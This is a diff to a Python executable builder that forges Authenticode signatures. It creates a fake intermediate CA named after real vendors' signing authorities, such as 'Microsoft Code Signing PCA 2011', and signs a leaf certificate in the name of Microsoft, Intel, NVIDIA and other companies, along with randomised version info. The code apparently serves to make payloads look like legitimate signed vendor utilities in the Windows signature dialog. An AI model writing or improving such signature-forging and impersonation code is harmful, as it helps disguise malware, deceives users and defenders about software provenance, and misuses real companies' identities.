@@ -288,6 +288,41 @@ _INTERNAL_NAMES = [
     "pericfg", "drvupd", "hlthsvc", "diagrt",
 ]
 
+# Mapping of company names → realistic intermediate CA names.
+# The CA cert mimics the issuing authority that would have signed
+# a code-signing certificate for that company.  If a company is
+# not in the map, a generic "<Company> Code Signing CA" is used.
+_CA_CHAIN_MAP = {
+    "Microsoft Corporation":
+        "Microsoft Code Signing PCA 2011",
+    "Intel Corporation":
+        "Intel External Basic Issuing CA 3B",
+    "NVIDIA Corporation":
+        "NVIDIA Signing CA 2014",
+    "Realtek Semiconductor Corp.":
+        "Symantec Class 3 SHA256 Code Signing CA",
+    "Logitech Inc.":
+        "DigiCert SHA2 Assured ID Code Signing CA",
+    "Dell Technologies":
+        "DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1",
+    "Hewlett-Packard Company":
+        "DigiCert SHA2 Assured ID Code Signing CA",
+    "Lenovo Group Limited":
+        "DigiCert SHA2 Assured ID Code Signing CA",
+    "ASUS Computer Inc.":
+        "DigiCert SHA2 Assured ID Code Signing CA",
+    "Broadcom Corporation":
+        "Symantec Class 3 SHA256 Code Signing CA",
+    "Synaptics Incorporated":
+        "DigiCert SHA2 Assured ID Code Signing CA",
+    "Texas Instruments":
+        "DigiCert SHA2 Assured ID Code Signing CA",
+    "Qualcomm Technologies Inc.":
+        "DigiCert SHA2 Assured ID Code Signing CA",
+    "Advanced Micro Devices Inc.":
+        "DigiCert SHA2 Assured ID Code Signing CA",
+}
+
 
 def generate_versioninfo_rc() -> str:
     """Generate a randomised VERSIONINFO .rc file.
@@ -443,11 +478,16 @@ def _sha256_alg_id() -> bytes:
 
 def _build_spc_indirect_data(pe_hash: bytes) -> bytes:
     """Build the SpcIndirectDataContent SEQUENCE."""
+    # SpcPeImageFlags: BIT STRING with 6 unused bits, value 0x00
+    # (matches osslsigncode — explicit zero-flags byte, not empty)
+    spc_flags = b'\x03\x02\x06\x00'
+    # SpcLink.file: BMPString "<<<Obsolete>>>" (standard Authenticode filler)
+    _obsolete_bmp = '<<<Obsolete>>>'.encode('utf-16-be')
     spc_pe_image = _der_seq(
-        _der_bitstr(b'', 0),
+        spc_flags,
         _der_tlv(0xA0,                                 # [0] EXPLICIT
             _der_tlv(0xA2,                              # [2] EXPLICIT file
-                _der_tlv(0x80, b'')                     # [0] IMPLICIT BMPString ""
+                _der_tlv(0x80, _obsolete_bmp)           # [0] IMPLICIT BMPString
             )
         )
     )
@@ -523,10 +563,16 @@ def _pe_checksum(data: bytearray) -> int:
     return csum & 0xFFFFFFFF
 
 
-# ── Self-signed Authenticode signing (pure Python) ──────────────────────
+# ── Authenticode signing with 2-level certificate chain ────────────────
 
 def _sign_pe_python(exe_path, company: str, description: str = "") -> bool:
-    """Self-signed Authenticode signing — pure Python, no external tools.
+    """Authenticode signing with a 2-level cert chain — pure Python.
+
+    Generates a fake intermediate CA cert (e.g. "Microsoft Code Signing
+    PCA 2011") and a leaf code-signing cert (e.g. "Microsoft Corporation")
+    signed by the CA.  Both certs are embedded in the PKCS#7 certificates
+    field, producing a realistic-looking chain in the Windows Digital
+    Signatures dialog.
 
     Uses the ``cryptography`` library for RSA key generation, X.509
     certificate creation, and PKCS#1 v1.5 signing.  The Authenticode-
@@ -571,8 +617,13 @@ def _sign_pe_python(exe_path, company: str, description: str = "") -> bool:
         print(f"[!] Unknown PE magic 0x{magic:04x} — signing skipped")
         return False
 
-    # ── Generate RSA key + self-signed cert ──
-    private_key = rsa.generate_private_key(
+    # ── Generate 2-level certificate chain ──
+    # Level 1: Intermediate CA (self-signed, mimics the issuing authority)
+    # Level 2: Leaf code-signing cert (signed by the CA)
+
+    ca_key = rsa.generate_private_key(
+        public_exponent=65537, key_size=2048)
+    leaf_key = rsa.generate_private_key(
         public_exponent=65537, key_size=2048)
 
     _OU = ["Software Engineering", "Product Development",
@@ -584,7 +635,42 @@ def _sign_pe_python(exe_path, company: str, description: str = "") -> bool:
     _ST = ["California", "Washington", "Texas", "Oregon"]
 
     now = datetime.datetime.utcnow()
-    subject = issuer = x509.Name([
+
+    # Look up realistic CA name for this company
+    ca_cn = _CA_CHAIN_MAP.get(company, f"{company} Code Signing CA")
+
+    # -- CA cert (self-signed intermediate) --
+    ca_subject = x509.Name([
+        x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
+        x509.NameAttribute(NameOID.ORGANIZATION_NAME, company.split()[0]
+                           if "Microsoft" in company else company),
+        x509.NameAttribute(NameOID.COMMON_NAME, ca_cn),
+    ])
+
+    ca_cert = (
+        x509.CertificateBuilder()
+        .subject_name(ca_subject)
+        .issuer_name(ca_subject)                   # self-signed
+        .public_key(ca_key.public_key())
+        .serial_number(x509.random_serial_number())
+        .not_valid_before(now - datetime.timedelta(days=rng.randint(730, 1825)))
+        .not_valid_after(now + datetime.timedelta(days=rng.randint(1095, 3650)))
+        .add_extension(
+            x509.BasicConstraints(ca=True, path_length=0),
+            critical=True)
+        .add_extension(
+            x509.KeyUsage(
+                digital_signature=False, content_commitment=False,
+                key_encipherment=False, data_encipherment=False,
+                key_agreement=False, key_cert_sign=True,
+                crl_sign=True, encipher_only=False,
+                decipher_only=False),
+            critical=True)
+        .sign(ca_key, hashes.SHA256())
+    )
+
+    # -- Leaf cert (signed by CA key) --
+    leaf_subject = x509.Name([
         x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
         x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, rng.choice(_ST)),
         x509.NameAttribute(NameOID.LOCALITY_NAME, rng.choice(_LOC)),
@@ -593,11 +679,11 @@ def _sign_pe_python(exe_path, company: str, description: str = "") -> bool:
         x509.NameAttribute(NameOID.COMMON_NAME, company),
     ])
 
-    cert = (
+    leaf_cert = (
         x509.CertificateBuilder()
-        .subject_name(subject)
-        .issuer_name(issuer)
-        .public_key(private_key.public_key())
+        .subject_name(leaf_subject)
+        .issuer_name(ca_subject)                   # issued by CA
+        .public_key(leaf_key.public_key())
         .serial_number(x509.random_serial_number())
         .not_valid_before(now - datetime.timedelta(days=rng.randint(0, 365)))
         .not_valid_after(now + datetime.timedelta(days=rng.randint(365, 1095)))
@@ -613,12 +699,15 @@ def _sign_pe_python(exe_path, company: str, description: str = "") -> bool:
                 crl_sign=False, encipher_only=False,
                 decipher_only=False),
             critical=True)
-        .sign(private_key, hashes.SHA256())
+        .sign(ca_key, hashes.SHA256())             # signed by CA key
     )
 
-    cert_der = cert.public_bytes(serialization.Encoding.DER)
-    issuer_der = cert.issuer.public_bytes()
-    serial_number = cert.serial_number
+    ca_cert_der = ca_cert.public_bytes(serialization.Encoding.DER)
+    leaf_cert_der = leaf_cert.public_bytes(serialization.Encoding.DER)
+
+    # SignerInfo references the leaf cert (issuer = CA, serial = leaf's)
+    leaf_issuer_der = leaf_cert.issuer.public_bytes()
+    leaf_serial = leaf_cert.serial_number
 
     # ── Compute Authenticode PE hash ──
     pe_data[checksum_offset:checksum_offset + 4] = b'\x00' * 4
@@ -636,26 +725,29 @@ def _sign_pe_python(exe_path, company: str, description: str = "") -> bool:
     content_digest = hashlib.sha256(spc_content).digest()
     attrs_body = _build_auth_attrs_body(content_digest, now, description)
 
-    # Sign authenticated attrs (re-tagged as SET 0x31 for signing)
+    # Sign authenticated attrs with the LEAF key (re-tagged as SET 0x31)
     attrs_for_signing = _der_tlv(0x31, attrs_body)
-    signature = private_key.sign(
+    signature = leaf_key.sign(
         attrs_for_signing, asym_padding.PKCS1v15(), hashes.SHA256())
 
     signer_info = _der_seq(
         _der_int(1),
-        _der_seq(issuer_der, _der_int(serial_number)),
+        _der_seq(leaf_issuer_der, _der_int(leaf_serial)),
         _sha256_alg_id(),
         _der_tlv(0xA0, attrs_body),               # authenticatedAttributes [0]
         _der_seq(_der_oid(_OID_RSA), _der_null()), # digestEncryptionAlgorithm
         _der_oct(signature),
     )
 
+    # Both certs in the chain: leaf first, then CA
+    all_certs = leaf_cert_der + ca_cert_der
+
     signed_data = _der_seq(
         _der_int(1),
         _der_set(_sha256_alg_id()),
         _der_seq(_der_oid(_OID_SPC_INDIRECT),
                  _der_tlv(0xA0, spc_content)),     # [0] EXPLICIT content
-        _der_tlv(0xA0, cert_der),                  # certificates [0] IMPLICIT
+        _der_tlv(0xA0, all_certs),                 # certificates [0] IMPLICIT
         _der_set(signer_info),
     )
 
@@ -679,7 +771,8 @@ def _sign_pe_python(exe_path, company: str, description: str = "") -> bool:
     struct.pack_into('<I', pe_data, checksum_offset, _pe_checksum(pe_data))
 
     exe_path.write_bytes(pe_data)
-    print(f"[+] Authenticode signature applied (self-signed, SHA-256)")
+    print(f"[+] Authenticode signature applied (2-cert chain: "
+          f"{ca_cn} → {company})")
     return True
 
 
